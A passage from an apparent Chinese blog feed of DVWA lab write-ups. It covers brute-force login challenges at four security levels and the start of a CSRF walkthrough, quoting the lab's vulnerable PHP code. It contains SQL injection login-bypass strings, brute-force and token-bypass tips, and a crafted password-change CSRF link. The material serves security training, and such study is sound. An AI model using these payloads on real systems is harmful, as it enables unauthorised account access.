class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p><code>isset()</code>函数在php中用来检测变量是否设置(该函数返回的是布尔类型的值，即true/false)<br> 服务器只是验证了参数Login是否被设置，没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的SQL注入漏洞。</p>
<p>方法一：万能密码（SQL注入）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin'or '1'='1</span><br><span class="line">admin' -- -</span><br><span class="line">admin' # </span><br></pre></td></tr></table></figure>

<p>方法二：暴力破解</p>
<p>使用BurpSuite载入字典爆破即可；</p>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">'Login'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Sanitise username input</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">'username'</span> ];</span><br><span class="line">        <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="comment">// Sanitise password input</span></span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">'password'</span> ];</span><br><span class="line">        <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">"SELECT * FROM `users` WHERE user = '<span class="subst">$user</span>' AND password = '<span class="subst">$pass</span>';"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) {</span><br><span class="line">            <span class="comment">// Get users details</span></span><br><span class="line">            <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">            <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">"avatar"</span>];</span><br><span class="line">            <span class="comment">// Login successful</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area <span class="subst">{$user}</span>&lt;/p&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;img src=\"<span class="subst">{$avatar}</span>\" /&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Login failed</span></span><br><span class="line">            <span class="title function_ invoke__">sleep</span>( <span class="number">2</span> );</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>对传过来的值，使用了 <code>mysql_real_escape_string()</code> 函数，转义了以下字符：\x00、\n、\r、\、’、”、\x1a</p>
<p>使用 <code>sleep(2)</code> 函数，如果密码错误，则延时两秒响应。</p>
<p>攻击：</p>
<p>SQL注入失效</p>
<p>可以直接进行爆破，只不过速度慢了；</p>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">'Login'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">        <span class="comment">// Sanitise username input</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">'username'</span> ];</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">        <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="comment">// Sanitise password input</span></span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">'password'</span> ];</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">        <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        <span class="variable">$query</span>  = <span class="string">"SELECT * FROM `users` WHERE user = '<span class="subst">$user</span>' AND password = '<span class="subst">$pass</span>';"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) {</span><br><span class="line">            <span class="comment">// Get users details</span></span><br><span class="line">            <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">            <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">"avatar"</span>];</span><br><span class="line">            <span class="comment">// Login successful</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area <span class="subst">{$user}</span>&lt;/p&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;img src=\"<span class="subst">{$avatar}</span>\" /&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Login failed</span></span><br><span class="line">            <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>增加了Ant-CSRF token，抵御CSRF攻击，同时也增加了爆破的难度。不过仍然可以使用BurpSuite进行破解，只需添加一个宏链接到上一个返回到token值即可；（参考：<a href="https://www.cnblogs.com/v1vvwv/p/DVWA-Brute-Force.html%EF%BC%89">https://www.cnblogs.com/v1vvwv/p/DVWA-Brute-Force.html）</a></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Login'</span> ] ) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">'password'</span>]) ) {</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">        <span class="comment">// Sanitise username input</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">'username'</span> ];</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">        <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="comment">// Sanitise password input</span></span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">'password'</span> ];</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">        <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line">        <span class="comment">// Default values</span></span><br><span class="line">        <span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line">        <span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line">        <span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':user'</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">'failed_login'</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  {</span><br><span class="line">            <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">            <span class="comment">//echo "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;";</span></span><br><span class="line">            <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">            <span class="variable">$last_login</span> = <span class="title function_ invoke__">strtotime</span>( <span class="variable">$row</span>[ <span class="string">'last_login'</span> ] );</span><br><span class="line">            <span class="variable">$timeout</span>    = <span class="variable">$last_login</span> + (<span class="variable">$lockout_time</span> * <span class="number">60</span>);</span><br><span class="line">            <span class="variable">$timenow</span>    = <span class="title function_ invoke__">time</span>();</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">            print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">            print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="comment">// Check to see if enough time has passed, if it hasn't locked the account</span></span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$timenow</span> &lt; <span class="variable">$timeout</span> ) {</span><br><span class="line">                <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">                <span class="comment">// print "The account is locked&lt;br /&gt;";</span></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':user'</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':password'</span>, <span class="variable">$pass</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="comment">// If its a valid login...</span></span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) {</span><br><span class="line">            <span class="comment">// Get users details</span></span><br><span class="line">            <span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">'avatar'</span> ];</span><br><span class="line">            <span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">'failed_login'</span> ];</span><br><span class="line">            <span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">'last_login'</span> ];</span><br><span class="line">            <span class="comment">// Login successful</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">{$user}</span>&lt;/em&gt;&lt;/p&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;img src=\"<span class="subst">{$avatar}</span>\" /&gt;"</span>;</span><br><span class="line">            <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) {</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">{$failed_login}</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;"</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// Reset bad login count</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':user'</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Login failed</span></span><br><span class="line">            <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">            <span class="comment">// Give the user some feedback</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">{$lockout_time}</span> minutes&lt;/em&gt;.&lt;/pre&gt;"</span>;</span><br><span class="line">            <span class="comment">// Update bad login count</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':user'</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// Set the last login time</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">':user'</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>设置错误 3 次，锁定 15 分钟；</p>
<p>如果在实战中遇到这种情况，可以采用爆破用户名；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201119195308.png"></p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
  </entry>
  <entry>
    <title>DVWA CSRF</title>
    <url>/DVWA-CSRF.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSRF，全称Cross-Site Request Forgery跨站请求伪造。其攻击过程如下；<span id="more"></span></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201119172940.png"></p>
<h3 id="CSRF与XSS的区别"><a href="#CSRF与XSS的区别" class="headerlink" title="CSRF与XSS的区别"></a>CSRF与XSS的区别</h3><p>XSS主要利用用户对站点的信任，而CSRF主要是利用站点对已知身份认证的信任。</p>
<p>XSS是用户自己点击链接来访问相应的网页的，而CSRF是在用户并不知情的情况下来提交请求的。</p>
<p>另外，两者的产生的原因也不一样，CSRF的是因为采用了隐式的认证方式，而XSS的是因为对用户输入没有进行有效的过滤。</p>
<h3 id="CSRF与XSS的关系"><a href="#CSRF与XSS的关系" class="headerlink" title="CSRF与XSS的关系"></a>CSRF与XSS的关系</h3><p>均利用用户的会话执行某些操作；</p>
<p>若一个站点存在XSS漏洞，则很大可能也存在CSRF漏洞；</p>
<p>若CSRF的恶意代码存在于第三方的站点，即使能有效地过滤用户的输入而防止XSS，也未必能防御CSRF。</p>
<h3 id="产生CSRF漏洞的原因"><a href="#产生CSRF漏洞的原因" class="headerlink" title="产生CSRF漏洞的原因"></a>产生CSRF漏洞的原因</h3><p>由于程序员的不严谨导致Web应用程序存在漏洞</p>
<p>Web浏览器对Cookie和HTTP身份验证等会话信息的处理存在缺陷</p>
<h3 id="漏洞利用的前提"><a href="#漏洞利用的前提" class="headerlink" title="漏洞利用的前提"></a>漏洞利用的前提</h3><ul>
<li>  用户已经完成身份认证</li>
<li>  新请求的提交不需要重新身份认证或确认机制</li>
<li>  攻击者必须了解Web APP请求的参数构造</li>
<li>  用户会被吸引去点击链接</li>
</ul>
<h3 id="几种常见的CSRF方式"><a href="#几种常见的CSRF方式" class="headerlink" title="几种常见的CSRF方式"></a>几种常见的CSRF方式</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. &lt;img&gt;标签属性</span><br><span class="line">2. &lt;iframe&gt;标签属性</span><br><span class="line">3. &lt;script&gt;标签属性</span><br><span class="line">4. JavaScript方法：Image对象、XMLHTTP对象</span><br></pre></td></tr></table></figure>

<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">'Change'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">'password_new'</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">'password_conf'</span> ];</span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) {</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">"UPDATE `users` SET password = '<span class="subst">$pass_new</span>' WHERE user = '"</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">"';"</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>根据源代码功能，可以更改密码，但密码通过POST方式传输。</p>
<p>当攻击者发送一封邮件又如下链接<code>http://localhost/DVWA/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change</code>，在不退出站点的情况下点击链接后，密码就会被改成123456；</p>
<p>或者链接是指向的是一个恶意网站。网站里面有一张图片，无法打开，但是这张图片的链接是<code>http://localhost/DVWA/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change</code>密码也会被更改为123456；</p>
